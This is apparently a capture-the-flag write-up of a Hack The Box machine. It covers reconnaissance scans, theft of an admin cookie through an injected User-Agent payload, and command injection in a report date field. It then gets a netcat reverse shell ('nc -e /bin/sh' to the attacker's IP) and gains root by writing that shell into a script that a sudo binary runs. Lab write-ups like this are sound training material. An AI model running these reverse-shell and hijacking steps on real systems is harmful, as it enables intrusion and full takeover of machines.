<img src="Pasted image 20240722185923.png" alt="HTB Profile Image" class="htb-profile-img">

<style>
  .htb-profile-img {
    width: 100%;
    max-width: 800px;
    border-radius: 8px;
    box-shadow: 0 0 10px rgba(0, 255, 0, 0.8); /* Initial glow effect */
    transition: box-shadow 0.3s ease-in-out, transform 0.3s ease-in-out; /* Smooth transition for glow and zoom effects */
  }

  .htb-profile-img:hover {
    box-shadow: 0 0 20px rgba(0, 255, 0, 1); /* Enhanced glow on hover */
    transform: scale(1.05); /* Zoom effect on hover */
  }
</style>

**Ping**
![[Pasted image 20240718164529.png]]

Nmap Scans
```
mapit 10.10.11.8
```

Nmap Default Scan
![[Pasted image 20240718164625.png]]

Nmap Script and Service Scan
![[Pasted image 20240718164754.png]]

Nmap All Port Scan
![[Pasted image 20240718165333.png]]

Gobuster Scan
```
gobuster dir -u http://10.10.11.8:5000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,html,txt,bak,aspx -s 200,204,301,302,307,403 -k --status-codes "" -o gobustet.txt
```

Tried to steal cookies
![[Pasted image 20240718165901.png]]

![[Pasted image 20240718165844.png]]

So I have Added the payload in user agent as well
![[Pasted image 20240718170455.png]]
then Forwarded and got some cookie
![[Pasted image 20240718170523.png]]

I can see that in my web server
![[Pasted image 20240718170548.png]]

Will use this cookie and try to authenticate as legitimate user
Decode base64 hash
![[Pasted image 20240718170703.png]]

Normally I can't access the dashboard
![[Pasted image 20240718170847.png]]

But now we can use the cookie to authenticate
![[Pasted image 20240718170928.png]]
I have changed the new cookie

Will forward and see, it worked.....!
```
is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0
```
![[Pasted image 20240718171102.png]]
Got admin's dashboard, also changed admin cookies via developer tool, So I won't last admin's dashboard.

Will Jump to Initial Foothold.....!

I have generated the report, nothing happened
![[Pasted image 20240718173105.png]]

Will inject something in date filed
```
whoami
```
![[Pasted image 20240718173257.png]]
![[Pasted image 20240718173209.png]]

Will get a reverse shell
```
nc -e /bin/sh 10.10.14.3 4444
```
![[Pasted image 20240718173330.png]]

Got it....!
![[Pasted image 20240718173343.png]]

User.txt
![[Pasted image 20240718173451.png]]



Will Jump to Privilege Escalation.....!

Our Privilege
```
sudo -l
```
![[Pasted image 20240718175904.png]]

Will check that
```
sudo /usr/bin/syscheck
```
![[Pasted image 20240718175935.png]]

Will read the binary
![[Pasted image 20240718180037.png]]
we can edit initdb.sh 

Will add reverse shell script
```
echo "nc -e /bin/sh 10.10.14.3 1234" > ./initdb.sh
```
![[Pasted image 20240718180132.png]]

Change permissions
```
chmod +x initdb.sh 
```
![[Pasted image 20240718180228.png]]

Will run the binary now
```
sudo /usr/bin/syscheck
```
![[Pasted image 20240718180301.png]]

Got shell as root.....!
![[Pasted image 20240718180327.png]]

**Root.txt**
![[Pasted image 20240718180403.png]]

